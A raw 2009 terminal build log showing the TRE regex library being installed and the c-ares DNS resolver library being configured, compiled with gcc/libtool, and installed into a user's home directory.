/usr/bin/install -c .libs/libtre.lai /home/jmap82/linux/extras/regexp/lib/libtre.la

/usr/bin/install -c .libs/libtre.a /home/jmap82/linux/extras/regexp/lib/libtre.a

ranlib /home/jmap82/linux/extras/regexp/lib/libtre.a

chmod 644 /home/jmap82/linux/extras/regexp/lib/libtre.a

PATH="$PATH:/sbin" ldconfig -n /home/jmap82/linux/extras/regexp/lib

----------------------------------------------------------------------

Libraries have been installed in:

   /home/jmap82/linux/extras/regexp/lib



If you ever happen to want to link against installed libraries

in a given directory, LIBDIR, you must either use libtool, and

specify the full pathname of the library, or use the `-LLIBDIR'

flag during linking and do at least one of the following:

   - add LIBDIR to the `LD_LIBRARY_PATH' environment variable

     during execution

   - add LIBDIR to the `LD_RUN_PATH' environment variable

     during linking

   - use the `-Wl,--rpath -Wl,LIBDIR' linker flag

   - have your system administrator add LIBDIR to `/etc/ld.so.conf'



See any operating system documentation about shared libraries for

more information, such as the ld(1) and ld.so(8) manual pages.

----------------------------------------------------------------------

test -z "/home/jmap82/linux/extras/regexp/include/tre" || mkdir -p -- "/home/jmap82/linux/extras/regexp/include/tre"

 /usr/bin/install -c -m 644 'regex.h' '/home/jmap82/linux/extras/regexp/include/tre/regex.h'

test -z "/home/jmap82/linux/extras/regexp/include/tre" || mkdir -p -- "/home/jmap82/linux/extras/regexp/include/tre"

 /usr/bin/install -c -m 644 'tre-config.h' '/home/jmap82/linux/extras/regexp/include/tre/tre-config.h'

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

make[1]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

Making install in tests

make[1]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/tests'

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/tests'

make[2]: Nothing to be done for `install-exec-am'.

make[2]: Nothing to be done for `install-data-am'.

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/tests'

make[1]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/tests'

Making install in utils

make[1]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/utils'

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/utils'

make[2]: Nothing to be done for `install-exec-am'.

make[2]: Nothing to be done for `install-data-am'.

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/utils'

make[1]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/utils'

Making install in po

make[1]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/po'

/bin/sh ../utils/mkinstalldirs /home/jmap82/linux/extras/regexp/share

mkdir -p -- /home/jmap82/linux/extras/regexp/share

mkdir -p -- /home/jmap82/linux/extras/regexp/share/locale/fi/LC_MESSAGES

installing fi.gmo as /home/jmap82/linux/extras/regexp/share/locale/fi/LC_MESSAGES/tre.mo

if test "tre" = "gettext-tools"; then \

	  /bin/sh ../utils/mkinstalldirs /home/jmap82/linux/extras/regexp/share/gettext/po; \

	  for file in Makefile.in.in remove-potcdate.sin quot.sed boldquot.sed en@quot.header en@boldquot.header insert-header.sin Rules-quot   Makevars.template; do \

	    /usr/bin/install -c -m 644 ./$file \

			    /home/jmap82/linux/extras/regexp/share/gettext/po/$file; \

	  done; \

	  for file in Makevars; do \

	    rm -f /home/jmap82/linux/extras/regexp/share/gettext/po/$file; \

	  done; \

	else \

	  : ; \

	fi

make[1]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/po'

Making install in m4

make[1]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/m4'

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/m4'

make[2]: Nothing to be done for `install-exec-am'.

make[2]: Nothing to be done for `install-data-am'.

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/m4'

make[1]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/m4'

make[1]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2'

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2'

make[2]: Nothing to be done for `install-exec-am'.

test -z "/home/jmap82/linux/extras/regexp/lib/pkgconfig" || mkdir -p -- "/home/jmap82/linux/extras/regexp/lib/pkgconfig"

 /usr/bin/install -c -m 644 'tre.pc' '/home/jmap82/linux/extras/regexp/lib/pkgconfig/tre.pc'

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2'

make[1]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2'

extracting c-ares resolver library

configuring c-ares library

checking whether to enable maintainer-specific portions of Makefiles... no

checking for a BSD-compatible install... /usr/bin/install -c

checking whether build environment is sane... yes

checking for gawk... no

checking for mawk... mawk

checking whether make sets $(MAKE)... yes

checking for gcc... gcc

checking for C compiler default output file name... a.out

checking whether the C compiler works... yes

checking whether we are cross compiling... no

checking for suffix of executables... 

checking for suffix of object files... o

checking whether we are using the GNU C compiler... yes

checking whether gcc accepts -g... yes

checking for gcc option to accept ANSI C... none needed

checking for style of include used by make... GNU

checking dependency style of gcc... gcc3

checking for a BSD-compatible install... /usr/bin/install -c

checking how to run the C preprocessor... gcc -E

checking for egrep... grep -E

checking for ANSI C header files... yes

checking for sys/types.h... yes

checking for sys/stat.h... yes

checking for stdlib.h... yes

checking for string.h... yes

checking for memory.h... yes

checking for strings.h... yes

checking for inttypes.h... yes

checking for stdint.h... yes

checking for unistd.h... yes

checking for ssize_t... yes

checking for library containing gethostbyname... none required

checking for library containing socket... none required

checking whether to enable debug options... no

checking build system type... i686-pc-linux-gnu

checking host system type... i686-pc-linux-gnu

checking for a sed that does not truncate output... /bin/sed

checking for ld used by gcc... /usr/bin/ld

checking if the linker (/usr/bin/ld) is GNU ld... yes

checking for /usr/bin/ld option to reload object files... -r

checking for BSD-compatible nm... /usr/bin/nm -B

checking whether ln -s works... yes

checking how to recognise dependent libraries... pass_all

checking dlfcn.h usability... yes

checking dlfcn.h presence... yes

checking for dlfcn.h... yes

checking the maximum length of command line arguments... 32768

checking command to parse /usr/bin/nm -B output from gcc object... ok

checking for objdir... .libs

checking for ar... ar

checking for ranlib... ranlib

checking for strip... strip

checking if gcc static flag  works... yes

checking if gcc supports -fno-rtti -fno-exceptions... no

checking for gcc option to produce PIC... -fPIC

checking if gcc PIC flag -fPIC works... yes

checking if gcc supports -c -o file.o... yes

checking whether the gcc linker (/usr/bin/ld) supports shared libraries... yes

checking dynamic linker characteristics... GNU/Linux ld.so

checking how to hardcode library paths into programs... immediate

checking whether stripping libraries is possible... yes

checking if libtool supports shared libraries... yes

checking whether to build shared libraries... 

checking whether to build static libraries... yes

configure: creating libtool

checking for sys/types.h... (cached) yes

checking for sys/time.h... yes

checking for sys/select.h... yes

checking for sys/socket.h... yes

checking for sys/ioctl.h... yes

checking for winsock.h... no

checking for netinet/in.h... yes

checking for net/if.h... yes

checking for arpa/nameser.h... yes

checking for arpa/nameser_compat.h... yes

checking for arpa/inet.h... yes

checking for socklen_t... yes

checking for PF_INET6... yes

checking for AF_INET6... yes

checking for struct in6_addr... yes

checking for struct sockaddr_in6... yes

checking if struct sockaddr_in6 has member sin6_scope_id... yes

checking for struct addrinfo... yes

checking for inet_pton... yes

checking if inet_pton supports IPv6... yes

checking for inet_net_pton... no

checking for inet_ntop... yes

checking if inet_ntop supports IPv6... yes

checking for struct in6_addr... yes

checking size of struct in6_addr... 16

checking for struct in_addr... yes

checking size of struct in_addr... 4

checking for bitncmp... no

checking for if_indextoname... yes

checking non-blocking sockets style... O_NONBLOCK

configure: creating ./config.status

config.status: creating Makefile

config.status: creating config.h

config.status: executing depfiles commands

compiling c-ares resolver library

make  all-am

make[1]: Entering directory `/home/jmap82/linux/extras/c-ares-1.3.0'

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_fds.lo -MD -MP -MF ".deps/ares_fds.Tpo" -c -o ares_fds.lo ares_fds.c; \

	then mv -f ".deps/ares_fds.Tpo" ".deps/ares_fds.Plo"; else rm -f ".deps/ares_fds.Tpo"; exit 1; fi

Script started on Sat 21 Mar 2009 11:43:48 PM JST
]0;jmap82@JMAP2: ~jmap82@JMAP2:~$  gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_fds.lo -MD -MP -MF .deps/ares_fds.Tpo -c ares_fds.c -o ares_fds.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_process.lo -MD -MP -MF ".deps/ares_process.Tpo" -c -o ares_process.lo ares_process.c; \

	then mv -f ".deps/ares_process.Tpo" ".deps/ares_process.Plo"; else rm -f ".deps/ares_process.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_process.lo -MD -MP -MF .deps/ares_process.Tpo -c ares_process.c -o ares_process.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_free_hostent.lo -MD -MP -MF ".deps/ares_free_hostent.Tpo" -c -o ares_free_hostent.lo ares_free_hostent.c; \

	then mv -f ".deps/ares_free_hostent.Tpo" ".deps/ares_free_hostent.Plo"; else rm -f ".deps/ares_free_hostent.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_free_hostent.lo -MD -MP -MF .deps/ares_free_hostent.Tpo -c ares_free_hostent.c -o ares_free_hostent.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_query.lo -MD -MP -MF ".deps/ares_query.Tpo" -c -o ares_query.lo ares_query.c; \

	then mv -f ".deps/ares_query.Tpo" ".deps/ares_query.Plo"; else rm -f ".deps/ares_query.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_query.lo -MD -MP -MF .deps/ares_query.Tpo -c ares_query.c -o ares_query.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares__close_sockets.lo -MD -MP -MF ".deps/ares__close_sockets.Tpo" -c -o ares__close_sockets.lo ares__close_sockets.c; \

	then mv -f ".deps/ares__close_sockets.Tpo" ".deps/ares__close_sockets.Plo"; else rm -f ".deps/ares__close_sockets.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares__close_sockets.lo -MD -MP -MF .deps/ares__close_sockets.Tpo -c ares__close_sockets.c -o ares__close_sockets.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_free_string.lo -MD -MP -MF ".deps/ares_free_string.Tpo" -c -o ares_free_string.lo ares_free_string.c; \

	then mv -f ".deps/ares_free_string.Tpo" ".deps/ares_free_string.Plo"; else rm -f ".deps/ares_free_string.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_free_string.lo -MD -MP -MF .deps/ares_free_string.Tpo -c ares_free_string.c -o ares_free_string.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_search.lo -MD -MP -MF ".deps/ares_search.Tpo" -c -o ares_search.lo ares_search.c; \

	then mv -f ".deps/ares_search.Tpo" ".deps/ares_search.Plo"; else rm -f ".deps/ares_search.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_search.lo -MD -MP -MF .deps/ares_search.Tpo -c ares_search.c -o ares_search.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares__get_hostent.lo -MD -MP -MF ".deps/ares__get_hostent.Tpo" -c -o ares__get_hostent.lo ares__get_hostent.c; \

	then mv -f ".deps/ares__get_hostent.Tpo" ".deps/ares__get_hostent.Plo"; else rm -f ".deps/ares__get_hostent.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares__get_hostent.lo -MD -MP -MF .deps/ares__get_hostent.Tpo -c ares__get_hostent.c -o ares__get_hostent.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_gethostbyaddr.lo -MD -MP -MF ".deps/ares_gethostbyaddr.Tpo" -c -o ares_gethostbyaddr.lo ares_gethostbyaddr.c; \

	then mv -f ".deps/ares_gethostbyaddr.Tpo" ".deps/ares_gethostbyaddr.Plo"; else rm -f ".deps/ares_gethostbyaddr.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_gethostbyaddr.lo -MD -MP -MF .deps/ares_gethostbyaddr.Tpo -c ares_gethostbyaddr.c -o ares_gethostbyaddr.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_send.lo -MD -MP -MF ".deps/ares_send.Tpo" -c -o ares_send.lo ares_send.c; \

	then mv -f ".deps/ares_send.Tpo" ".deps/ares_send.Plo"; else rm -f ".deps/ares_send.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_send.lo -MD -MP -MF .deps/ares_send.Tpo -c ares_send.c -o ares_send.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares__read_line.lo -MD -MP -MF ".deps/ares__read_line.Tpo" -c -o ares__read_line.lo ares__read_line.c; \

	then mv -f ".deps/ares__read_line.Tpo" ".deps/ares__read_line.Plo"; else rm -f ".deps/ares__read_line.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares__read_line.lo -MD -MP -MF .deps/ares__read_line.Tpo -c ares__read_line.c -o ares__read_line.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_gethostbyname.lo -MD -MP -MF ".deps/ares_gethostbyname.Tpo" -c -o ares_gethostbyname.lo ares_gethostbyname.c; \

	then mv -f ".deps/ares_gethostbyname.Tpo" ".deps/ares_gethostbyname.Plo"; else rm -f ".deps/ares_gethostbyname.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_gethostbyname.lo -MD -MP -MF .deps/ares_gethostbyname.Tpo -c ares_gethostbyname.c -o ares_gethostbyname.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_strerror.lo -MD -MP -MF ".deps/ares_strerror.Tpo" -c -o ares_strerror.lo ares_strerror.c; \

	then mv -f ".deps/ares_strerror.Tpo" ".deps/ares_strerror.Plo"; else rm -f ".deps/ares_strerror.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_strerror.lo -MD -MP -MF .deps/ares_strerror.Tpo -c ares_strerror.c -o ares_strerror.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_cancel.lo -MD -MP -MF ".deps/ares_cancel.Tpo" -c -o ares_cancel.lo ares_cancel.c; \

	then mv -f ".deps/ares_cancel.Tpo" ".deps/ares_cancel.Plo"; else rm -f ".deps/ares_cancel.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_cancel.lo -MD -MP -MF .deps/ares_cancel.Tpo -c ares_cancel.c -o ares_cancel.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_init.lo -MD -MP -MF ".deps/ares_init.Tpo" -c -o ares_init.lo ares_init.c; \

	then mv -f ".deps/ares_init.Tpo" ".deps/ares_init.Plo"; else rm -f ".deps/ares_init.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_init.lo -MD -MP -MF .deps/ares_init.Tpo -c ares_init.c -o ares_init.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_timeout.lo -MD -MP -MF ".deps/ares_timeout.Tpo" -c -o ares_timeout.lo ares_timeout.c; \

	then mv -f ".deps/ares_timeout.Tpo" ".deps/ares_timeout.Plo"; else rm -f ".deps/ares_timeout.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_timeout.lo -MD -MP -MF .deps/ares_timeout.Tpo -c ares_timeout.c -o ares_timeout.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_destroy.lo -MD -MP -MF ".deps/ares_destroy.Tpo" -c -o ares_destroy.lo ares_destroy.c; \

	then mv -f ".deps/ares_destroy.Tpo" ".deps/ares_destroy.Plo"; else rm -f ".deps/ares_destroy.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_destroy.lo -MD -MP -MF .deps/ares_destroy.Tpo -c ares_destroy.c -o ares_destroy.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_mkquery.lo -MD -MP -MF ".deps/ares_mkquery.Tpo" -c -o ares_mkquery.lo ares_mkquery.c; \

	then mv -f ".deps/ares_mkquery.Tpo" ".deps/ares_mkquery.Plo"; else rm -f ".deps/ares_mkquery.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_mkquery.lo -MD -MP -MF .deps/ares_mkquery.Tpo -c ares_mkquery.c -o ares_mkquery.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_version.lo -MD -MP -MF ".deps/ares_version.Tpo" -c -o ares_version.lo ares_version.c; \

	then mv -f ".deps/ares_version.Tpo" ".deps/ares_version.Plo"; else rm -f ".deps/ares_version.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_version.lo -MD -MP -MF .deps/ares_version.Tpo -c ares_version.c -o ares_version.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_expand_name.lo -MD -MP -MF ".deps/ares_expand_name.Tpo" -c -o ares_expand_name.lo ares_expand_name.c; \

	then mv -f ".deps/ares_expand_name.Tpo" ".deps/ares_expand_name.Plo"; else rm -f ".deps/ares_expand_name.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_expand_name.lo -MD -MP -MF .deps/ares_expand_name.Tpo -c ares_expand_name.c -o ares_expand_name.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_parse_a_reply.lo -MD -MP -MF ".deps/ares_parse_a_reply.Tpo" -c -o ares_parse_a_reply.lo ares_parse_a_reply.c; \

	then mv -f ".deps/ares_parse_a_reply.Tpo" ".deps/ares_parse_a_reply.Plo"; else rm -f ".deps/ares_parse_a_reply.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_parse_a_reply.lo -MD -MP -MF .deps/ares_parse_a_reply.Tpo -c ares_parse_a_reply.c -o ares_parse_a_reply.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT windows_port.lo -MD -MP -MF ".deps/windows_port.Tpo" -c -o windows_port.lo windows_port.c; \

	then mv -f ".deps/windows_port.Tpo" ".deps/windows_port.Plo"; else rm -f ".deps/windows_port.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT windows_port.lo -MD -MP -MF .deps/windows_port.Tpo -c windows_port.c -o windows_port.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_expand_string.lo -MD -MP -MF ".deps/ares_expand_string.Tpo" -c -o ares_expand_string.lo ares_expand_string.c; \

	then mv -f ".deps/ares_expand_string.Tpo" ".deps/ares_expand_string.Plo"; else rm -f ".deps/ares_expand_string.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_expand_string.lo -MD -MP -MF .deps/ares_expand_string.Tpo -c ares_expand_string.c -o ares_expand_string.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_parse_ptr_reply.lo -MD -MP -MF ".deps/ares_parse_ptr_reply.Tpo" -c -o ares_parse_ptr_reply.lo ares_parse_ptr_reply.c; \

	then mv -f ".deps/ares_parse_ptr_reply.Tpo" ".deps/ares_parse_ptr_reply.Plo"; else rm -f ".deps/ares_parse_ptr_reply.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_parse_ptr_reply.lo -MD -MP -MF .deps/ares_parse_ptr_reply.Tpo -c ares_parse_ptr_reply.c -o ares_parse_ptr_reply.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_parse_aaaa_reply.lo -MD -MP -MF ".deps/ares_parse_aaaa_reply.Tpo" -c -o ares_parse_aaaa_reply.lo ares_parse_aaaa_reply.c; \

	then mv -f ".deps/ares_parse_aaaa_reply.Tpo" ".deps/ares_parse_aaaa_reply.Plo"; else rm -f ".deps/ares_parse_aaaa_reply.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_parse_aaaa_reply.lo -MD -MP -MF .deps/ares_parse_aaaa_reply.Tpo -c ares_parse_aaaa_reply.c -o ares_parse_aaaa_reply.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT ares_getnameinfo.lo -MD -MP -MF ".deps/ares_getnameinfo.Tpo" -c -o ares_getnameinfo.lo ares_getnameinfo.c; \

	then mv -f ".deps/ares_getnameinfo.Tpo" ".deps/ares_getnameinfo.Plo"; else rm -f ".deps/ares_getnameinfo.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT ares_getnameinfo.lo -MD -MP -MF .deps/ares_getnameinfo.Tpo -c ares_getnameinfo.c -o ares_getnameinfo.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT inet_net_pton.lo -MD -MP -MF ".deps/inet_net_pton.Tpo" -c -o inet_net_pton.lo inet_net_pton.c; \

	then mv -f ".deps/inet_net_pton.Tpo" ".deps/inet_net_pton.Plo"; else rm -f ".deps/inet_net_pton.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT inet_net_pton.lo -MD -MP -MF .deps/inet_net_pton.Tpo -c inet_net_pton.c -o inet_net_pton.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT bitncmp.lo -MD -MP -MF ".deps/bitncmp.Tpo" -c -o bitncmp.lo bitncmp.c; \

	then mv -f ".deps/bitncmp.Tpo" ".deps/bitncmp.Plo"; else rm -f ".deps/bitncmp.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT bitncmp.lo -MD -MP -MF .deps/bitncmp.Tpo -c bitncmp.c -o bitncmp.o

if /bin/bash ./libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -MT inet_ntop.lo -MD -MP -MF ".deps/inet_ntop.Tpo" -c -o inet_ntop.lo inet_ntop.c; \

	then mv -f ".deps/inet_ntop.Tpo" ".deps/inet_ntop.Plo"; else rm -f ".deps/inet_ntop.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I. -g -O2 -MT inet_ntop.lo -MD -MP -MF .deps/inet_ntop.Tpo -c inet_ntop.c -o inet_ntop.o

/bin/bash ./libtool --tag=CC --mode=link gcc  -g -O2   -o libcares.la -rpath /home/jmap82/linux/extras/c-ares/lib -version-info 0:0:0 ares_fds.lo ares_process.lo ares_free_hostent.lo ares_query.lo ares__close_sockets.lo ares_free_string.lo ares_search.lo ares__get_hostent.lo ares_gethostbyaddr.lo ares_send.lo ares__read_line.lo ares_gethostbyname.lo ares_strerror.lo ares_cancel.lo ares_init.lo ares_timeout.lo ares_destroy.lo ares_mkquery.lo ares_version.lo ares_expand_name.lo ares_parse_a_reply.lo windows_port.lo ares_expand_string.lo ares_parse_ptr_reply.lo ares_parse_aaaa_reply.lo ares_getnameinfo.lo inet_net_pton.lo bitncmp.lo inet_ntop.lo   

mkdir .libs

ar cru .libs/libcares.a  ares_fds.o ares_process.o ares_free_hostent.o ares_query.o ares__close_sockets.o ares_free_string.o ares_search.o ares__get_hostent.o ares_gethostbyaddr.o ares_send.o ares__read_line.o ares_gethostbyname.o ares_strerror.o ares_cancel.o ares_init.o ares_timeout.o ares_destroy.o ares_mkquery.o ares_version.o ares_expand_name.o ares_parse_a_reply.o windows_port.o ares_expand_string.o ares_parse_ptr_reply.o ares_parse_aaaa_reply.o ares_getnameinfo.o inet_net_pton.o bitncmp.o inet_ntop.o

ranlib .libs/libcares.a

creating libcares.la

(cd .libs && rm -f libcares.la && ln -s ../libcares.la libcares.la)

make[1]: Leaving directory `/home/jmap82/linux/extras/c-ares-1.3.0'

installing c-ares resolver library

make[1]: Entering directory `/home/jmap82/linux/extras/c-ares-1.3.0'

test -z "/home/jmap82/linux/extras/c-ares/lib" || mkdir -p -- "/home/jmap82/linux/extras/c-ares/lib"

 /bin/bash ./libtool --mode=install /usr/bin/install -c  'libcares.la' '/home/jmap82/linux/extras/c-ares/lib/libcares.la'

/usr/bin/install -c .libs/libcares.lai /home/jmap82/linux/extras/c-ares/lib/libcares.la

/usr/bin/install -c .libs/libcares.a /home/jmap82/linux/extras/c-ares/lib/libcares.a

ranlib /home/jmap82/linux/extras/c-ares/lib/libcares.a

chmod 644 /home/jmap82/linux/extras/c-ares/lib/libcares.a

PATH="$PATH:/sbin" ldconfig -n /home/jmap82/linux/extras/c-ares/lib

----------------------------------------------------------------------

Libraries have been installed in:

   /home/jmap82/linux/extras/c-ares/lib



If you ever happen to want to link against installed libraries

in a given directory, LIBDIR, you must either use libtool, and

specify the full pathname of the library, or use the `-LLIBDIR'

flag during linking and do at least one of the following:

   - add LIBDIR to the `LD_LIBRARY_PATH' environment variable

     during execution

   - add LIBDIR to the `LD_RUN_PATH' environment variable

     during linking

   - use the `-Wl,--rpath -Wl,LIBDIR' linker flag

   - have your system administrator add LIBDIR to `/etc/ld.so.conf'



See any operating system documentation about shared libraries for

more information, such as the ld(1) and ld.so(8) manual pages.

----------------------------------------------------------------------

test -z "/home/jmap82/linux/extras/c-ares/include" || mkdir -p -- "/home/jmap82/linux/extras/c-ares/include"

 /usr/bin/install -c -m 644 'ares.h' '/home/jmap82/linux/extras/c-ares/include/ares.h'

 /usr/bin/install -c -m 644 'ares_version.h' '/home/jmap82/linux/extras/c-ares/include/ares_version.h'

test -z "/home/jmap82/linux/extras/c-ares/man/man3" || mkdir -p -- "/home/jmap82/linux/extras/c-ares/man/man3"

 /usr/bin/install -c -m 644 './ares_destroy.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_destroy.3'

 /usr/bin/install -c -m 644 './ares_expand_name.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_expand_name.3'

 /usr/bin/install -c -m 644 './ares_expand_string.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_expand_string.3'

 /usr/bin/install -c -m 644 './ares_fds.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_fds.3'

 /usr/bin/install -c -m 644 './ares_free_hostent.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_free_hostent.3'

 /usr/bin/install -c -m 644 './ares_free_string.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_free_string.3'

 /usr/bin/install -c -m 644 './ares_gethostbyaddr.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_gethostbyaddr.3'

 /usr/bin/install -c -m 644 './ares_gethostbyname.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_gethostbyname.3'

 /usr/bin/install -c -m 644 './ares_init.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_init.3'

 /usr/bin/install -c -m 644 './ares_init_options.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_init_options.3'

 /usr/bin/install -c -m 644 './ares_mkquery.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_mkquery.3'

 /usr/bin/install -c -m 644 './ares_parse_a_reply.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_parse_a_reply.3'

 /usr/bin/install -c -m 644 './ares_parse_ptr_reply.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_parse_ptr_reply.3'

 /usr/bin/install -c -m 644 './ares_process.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_process.3'

 /usr/bin/install -c -m 644 './ares_query.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_query.3'

 /usr/bin/install -c -m 644 './ares_search.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_search.3'

 /usr/bin/install -c -m 644 './ares_send.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_send.3'
